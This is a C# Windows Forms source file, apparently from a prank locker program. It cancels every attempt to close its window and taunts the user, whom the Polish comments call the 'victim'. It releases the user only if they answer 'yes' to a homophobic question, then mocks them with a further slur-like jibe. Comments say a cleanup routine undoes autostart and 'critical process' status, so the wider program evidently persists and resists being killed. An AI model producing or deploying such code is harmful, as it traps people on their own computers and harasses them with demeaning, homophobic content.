using System;
using System.Windows.Forms;

namespace youCantLeavethis
{
    public partial class youCantLeavethis : Form
    {
        // Flaga ustawiana tuż przed legalnym zamknięciem — bez niej on_close zawsze anuluje wyjście
        volatile bool ending = false;

        public youCantLeavethis()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Podpinamy własny handler zamknięcia — każda próba zamknięcia okna przechodzi przez on_close
            this.FormClosing += new FormClosingEventHandler(on_close);
        }

        /// <summary>
        /// Wywoływane przy każdej próbie zamknięcia okna (X, Alt+F4, TaskManager UI itp.).
        /// Jeśli nie jesteśmy w trakcie legalnego wyjścia, anuluje zdarzenie i drwi z ofiary.
        /// </summary>
        private void on_close(object sender, FormClosingEventArgs e)
        {
            // Jedyny wyjątek — fix() ustawia ending=true przed wywołaniem Close()
            if (ending) return;

            // Anuluj zamknięcie i poinformuj ofiarę o jej porażce
            e.Cancel = true;
            MessageBox.Show("Nah that aint gonna work lol", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
        }

        /// <summary>
        /// Jedyny przycisk w oknie — ukryta furtka wyjścia.
        /// Żeby wyjść, użytkownik musi przyznać się do bycia gejem.
        /// Kliknięcie "Nie" = filozoficzny kontratak.
        /// </summary>
        private void button1_Click(object sender, EventArgs e)
        {
            DialogResult question = MessageBox.Show("Oh so you are gay?", "Question", MessageBoxButtons.YesNo, MessageBoxIcon.Question);

            if (question == DialogResult.Yes)
            {
                // Ofiara zaakceptowała warunki — wyświetl ostatni komunikat i wykonaj czysty shutdown
                MessageBox.Show("alright, remember to tell your parents so they can be disappointed", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);

                ending = true;   // Pozwól on_close przepuścić zdarzenie zamknięcia
                this.Close();    // Zamknij formularz (bez anulowania dzięki fladze)
                Program.fix();   // Posprzątaj: usuń autostart, cofnij status krytyczny, zabij proces
            }
            else
            {
                // Klasyczny argument nie do odparcia
                MessageBox.Show("Then why did you lie by clicking the button?", "Question", MessageBoxButtons.OK, MessageBoxIcon.Question);
            }
        }

        // Pusty handler — label tylko dekoracyjny, kliknięcie nic nie robi
        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}